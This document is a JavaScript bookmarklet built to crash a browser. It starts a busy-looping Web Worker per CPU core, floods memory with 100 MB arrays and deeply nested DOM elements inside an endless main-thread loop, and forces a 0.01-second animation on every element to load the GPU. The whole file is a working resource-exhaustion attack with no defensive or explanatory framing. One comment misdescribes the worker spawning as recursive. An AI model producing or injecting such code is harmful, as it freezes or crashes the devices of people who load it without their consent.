javascript:(function(){
    /* 1. CPU: Recursive Worker Spawning */
    // Instead of just 8 workers, this attempts to create an endless chain
    const workerCode = `
        const work = () => { while(true) { Math.sqrt(Math.random()); } };
        self.onmessage = () => { work(); };
        work();
    `;
    const blob = new Blob([workerCode], {type: 'text/javascript'});
    const url = URL.createObjectURL(blob);
    
    for(let i = 0; i < (navigator.hardwareConcurrency || 16); i++) {
        new Worker(url);
    }

    /* 2. RAM & MAIN THREAD: Synchronous Heap Flooding */
    // Using a while(true) loop inside a setTimeout to bypass the initial load,
    // then locking the main thread completely so the UI freezes.
    setTimeout(() => {
        const leak = [];
        while(true) {
            // Pushing massive 100MB arrays into memory
            leak.push(new Float64Array(12.5 * 1024 * 1024).fill(Math.random()));
            
            // 3. DOM: Deep Nesting (Inside the loop to compound the crash)
            const frag = document.createDocumentFragment();
            let parent = document.createElement('div');
            for(let j = 0; j < 500; j++) {
                const child = document.createElement('div');
                child.style.cssText = "transform:rotate(1deg); filter:blur(1px);";
                parent.appendChild(child);
                parent = child;
            }
            document.body.appendChild(parent);
        }
    }, 100);

    /* 4. GPU: Force Extreme Composite Layers */
    const style = document.createElement('style');
    style.innerHTML = `
        @keyframes meltdown {
            0% { transform: scale(1) rotate(0deg); filter: blur(0px); }
            50% { transform: scale(1.5) rotate(180deg); filter: blur(50px); }
            100% { transform: scale(1) rotate(360deg); filter: blur(0px); }
        }
        * { 
            animation: meltdown 0.01s infinite !important; 
            will-change: transform, filter !important;
        }
    `;
    document.head.appendChild(style);
})();
